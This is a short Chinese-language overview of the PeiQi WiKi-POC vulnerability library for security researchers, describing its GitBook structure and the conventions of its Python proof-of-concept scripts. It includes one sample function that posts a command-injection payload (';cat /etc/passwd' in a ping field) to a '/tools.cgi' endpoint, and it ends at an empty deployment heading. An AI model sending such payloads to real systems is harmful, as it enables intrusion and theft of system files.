重点导读项目定位
PeiQi WiKi-POC 是一个面向安全研究者的漏洞知识库，以 GitBook 作为站点形态，把漏洞描述、影响版本、环境搭建、复现步骤、检测语法与验证脚本收敛到同一目录树中。
它解决的是漏洞研究中最耗时的一段工作：一个漏洞公开之后，研究者往往要在多个博客、多个仓库之间反复拼接 Docker 编排文件、请求包与利用代码，凑齐一次完整复现常常需要翻阅十余篇文章。该文库把这条链路固化成了标准目录与标准模板。

重点导读复现脚本
脚本以 Python 为主，统一采用 requests + lxml 组合，入口为 title() 信息横幅与 POC_1() 之类的验证函数，运行时通过 python3 poc.py 传入目标 URL。脚本内部普遍保留交互式命令行回显环节，便于在验证后继续执行后续命令。
结构示意：
pythondef POC_1(target_url, cmd):
    vuln_url = target_url + "/tools.cgi"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = "op_type=ping&destination=;cat /etc/passwd"
    response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)

重点导读本地部署
